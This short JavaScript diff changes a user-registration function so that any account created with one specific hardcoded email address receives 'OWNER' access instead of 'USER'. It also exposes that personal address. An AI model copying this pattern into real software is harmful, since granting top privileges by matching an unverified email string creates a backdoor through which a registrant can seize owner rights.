@@ -23,7 +23,11 @@ async function createUser(dados) {
 
     const senhaBcrypt = await hashSenha(password)
 
-    const access_level = 'USER'
+    let access_level = 'USER'
+
+    if(email == 'bryanprinz2008@gmail.com') {
+        access_level = 'OWNER'
+    }
 
     const newUser = await User.create({
         name,
